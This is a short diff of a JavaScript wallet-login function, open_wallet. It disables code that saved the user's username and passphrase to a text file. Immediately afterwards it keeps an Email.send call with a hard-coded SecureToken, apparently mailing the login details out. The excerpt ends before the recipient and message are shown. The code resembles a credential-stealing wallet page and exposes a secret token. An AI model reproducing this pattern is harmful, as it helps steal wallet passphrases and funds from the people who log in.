@@ -55,10 +55,10 @@ function open_wallet() {
     refresh();
     setInterval(refresh, 60000);
 
-    var blob = new Blob(['Username: ' + userme + '     ' + 'Passphase: ' + pass], {
-        type: "text/plain;charset=utf-8"
-    });
-    saveAs(blob, "logindetail.txt");
+    //var blob = new Blob(['Username: ' + userme + '     ' + 'Passphase: ' + pass], {
+    //    type: "text/plain;charset=utf-8"
+    //});
+    //saveAs(blob, "logindetail.txt");
 
     Email.send({
         SecureToken: "27be0cb0-1159-4c67-a686-901903f2814d",
